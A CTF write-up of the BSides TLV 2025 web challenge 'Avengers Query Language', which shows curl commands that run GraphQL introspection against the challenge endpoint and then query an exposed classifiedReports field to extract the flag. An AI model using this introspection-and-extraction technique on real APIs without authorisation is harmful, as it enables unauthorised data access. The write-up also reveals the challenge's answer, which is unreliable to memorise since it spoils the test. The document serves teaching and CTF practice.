# Avengers Query Language

 * Category: Web
 * Solved by the JCTF Team

## Description

> Welcome to the S.H.I.E.L.D. data archives, now powered by the new "Avengers Query Language" (AQL). This state-of-the-art system allows agents to retrieve intelligence on any threat with a single, flexible query.
> 
> Your mission: Interrogate the AQL endpoint!

## Solution

We arrive to a website which seems to perform GraphQL queries under the hood:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Query_Language]
└─$ curl 'https://bstlv25-avengers-query-language.chals.io/graphql' -X POST -H 'Content-Type: application/json' --data-raw '{"query":"{ heroes { id name } }"}'
{"data": {"heroes": [{"id": 1, "name": "Iron Man"}, {"id": 2, "name": "Captain America"}, {"id": 3, "name": "Thor"}, {"id": 4, "name": "Star-Lord"}, {"id": 5, "name": "Black Widow"}, {"id": 6, "name": "Hulk"}]}}
```

This is a simple and basic GraphQL challenge. We start by querying the schema:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Query_Language]
└─$ curl 'https://bstlv25-avengers-query-language.chals.io/graphql' -X POST -H 'Content-Type: application/json' --data-raw '{"query":"{  __schema { queryType { name fields { name description args { name description } } } }}"}'
{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "heroes", "description": null, "args": []}, {"name": "hero", "description": null, "args": [{"name": "id", "description": null}]}, {"name": "teams", "description": null, "args": []}, {"name": "team", "description": null, "args": [{"name": "id", "description": null}]}, {"name": "missions", "description": null, "args": []}, {"name": "mission", "description": null, "args": [{"name": "id", "description": null}]}, {"name": "gadgets", "description": null, "args": []}, {"name": "enemies", "description": null, "args": []}, {"name": "classifiedReports", "description": null, "args": []}]}}}}
```

The `classifiedReports` direction seems interesting, let's learn more about that:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Query_Language]
└─$ curl 'https://bstlv25-avengers-query-language.chals.io/graphql' -X POST -H 'Content-Type: application/json' --data-raw '{"query":"{ __type(name: \"ClassifiedReport\") { name fields { name description type { kind name ofType { kind name } } } }}"}'
{"data": {"__type": {"name": "ClassifiedReport", "fields": [{"name": "id", "description": null, "type": {"kind": "NON_NULL", "name": null, "ofType": {"kind": "SCALAR", "name": "Int"}}}, {"name": "title", "description": null, "type": {"kind": "NON_NULL", "name": null, "ofType": {"kind": "SCALAR", "name": "String"}}}, {"name": "content", "description": null, "type": {"kind": "NON_NULL", "name": null, "ofType": {"kind": "SCALAR", "name": "String"}}}, {"name": "classificationLevel", "description": null, "type": {"kind": "NON_NULL", "name": null, "ofType": {"kind": "SCALAR", "name": "String"}}}, {"name": "leakedById", "description": null, "type": {"kind": "NON_NULL", "name": null, "ofType": {"kind": "SCALAR", "name": "Int"}}}, {"name": "leakedBy", "description": null, "type": {"kind": "OBJECT", "name": "Hero", "ofType": null}}]}}}
```

Finally, let's query it to get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Avengers_Query_Language]
└─$ curl 'https://bstlv25-avengers-query-language.chals.io/graphql' -X POST -H 'Content-Type: application/json' --data-raw '{"query":"{ classifiedReports { id title classificationLevel content leakedById leakedBy { id name } } }"}'
{"data": {"classifiedReports": [{"id": 1, "title": "Operation Endgame", "classificationLevel": "TOP SECRET", "content": "BSidesTLV2025{Gr4phQL_1ntr0sp3ct10n_L34k}", "leakedById": 1, "leakedBy": {"id": 1, "name": "Iron Man"}}, {"id": 2, "title": "Stark Industries Breach", "classificationLevel": "SECRET", "content": "Decoy data - not the real flag", "leakedById": 2, "leakedBy": {"id": 2, "name": "Captain America"}}, {"id": 3, "title": "Asgardian Artifacts", "classificationLevel": "CONFIDENTIAL", "content": "Classified information about Asgardian relics", "leakedById": 3, "leakedBy": {"id": 3, "name": "Thor"}}]}}
```